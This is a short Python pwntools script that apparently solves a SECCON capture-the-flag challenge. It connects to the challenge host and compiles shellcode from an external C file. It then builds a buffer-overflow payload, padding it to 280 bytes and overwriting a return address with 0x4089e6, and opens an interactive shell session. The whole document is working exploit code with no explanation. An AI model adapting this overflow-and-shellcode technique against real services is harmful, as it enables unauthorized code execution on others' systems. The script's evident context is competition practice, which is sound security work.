#!/usr/bin/python
from pwn import *
import cshc
context("amd64", "linux")
r = remote("pinhole.pwn.seccon.jp",   10000)
#r = remote("ctf",   4000)
raw_input(">");

#sysenter
buf = flat(asm("sub rsp, 64"));
buf += cshc.arch("x86_64").compile(open("exploit.c", "r").read())
assert len(buf) <= 280
buf += "A" * (280 - len(buf))
buf += p64(0x4089e6)
buf += "A" * (512 - len(buf))
r.send(buf)
r.interactive()
